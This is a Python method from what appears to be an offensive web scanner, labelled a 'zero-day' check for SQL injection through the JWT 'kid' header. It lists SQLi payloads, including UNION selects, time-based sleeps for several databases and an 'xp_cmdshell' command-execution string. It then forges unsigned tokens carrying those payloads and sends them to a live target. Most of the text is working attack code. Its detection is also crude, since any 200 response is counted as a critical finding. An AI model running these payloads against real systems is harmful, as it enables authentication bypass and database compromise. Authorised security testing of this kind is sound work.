    def test_zeroday_jwt_kid_sqli(self):
        """Zero-day #92 — JWT kid SQL Injection."""
        if not self.deep: return
        self._print("[*]", "Zero-day: JWT kid SQLi...", "INFO")
        import base64, json as _json
        sqli_kids = [
            "' UNION SELECT 'AAAAAAAA'-- -",
            "' UNION SELECT 'secret'-- -",
            "1' AND 1=1-- -",
            "1' AND SLEEP(5)-- -",
            "1' UNION SELECT 'private-key'-- -",
            "' OR '1'='1",
            "1; SELECT pg_sleep(5)",
            "1; WAITFOR DELAY '0:0:5'",
            "1'; EXEC xp_cmdshell('dir')-- -",
        ]
        # Get a valid JWT first
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "").replace("Bearer ", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = parts[1]
        except Exception: return
        for kid in sqli_kids:
            evil_header = dict(header)
            evil_header["kid"] = kid
            evil_header_b64 = base64.urlsafe_b64encode(
                _json.dumps(evil_header).encode()).decode().rstrip("=")
            evil_jwt = f"{evil_header_b64}.{payload}."
            t1 = time.time()
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
            t2 = time.time()
            if r2 and r2.status_code == 200:
                self._add_vuln(f"Zero-day JWT kid SQLi: {kid[:30]}",
                                "CRITICAL", self.target,
                                f"SQLi via kid header accepted",
                                kid=kid)
            if (t2 - t1) > 5.0:
                self._add_vuln(f"Zero-day JWT kid Time-based SQLi: {kid[:30]}",
                                "CRITICAL", self.target,
                                f"Response delayed {(t2-t1):.2f}s — likely SQLi",
                                kid=kid)

